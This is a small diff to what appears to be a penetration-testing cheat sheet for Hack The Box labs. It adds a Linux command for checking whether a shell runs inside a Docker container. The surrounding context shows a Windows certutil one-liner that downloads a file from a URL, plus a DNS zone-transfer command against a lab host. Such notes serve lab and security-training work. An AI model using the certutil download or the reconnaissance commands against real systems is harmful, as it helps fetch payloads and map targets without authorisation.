@@ -25,6 +25,14 @@ cmd.exe /C net use /D /Y * && cmd.exe /C certutil.exe -urlcache -split -f 'http:
 
 # Linux
 
+## Information gather
+
+### check if is the docker 
+
+```
+cat /proc/1/cgroup
+```
+
 ## DNS zone transfer
 
 `dig axfr @10.10.10.52 matis.htb`
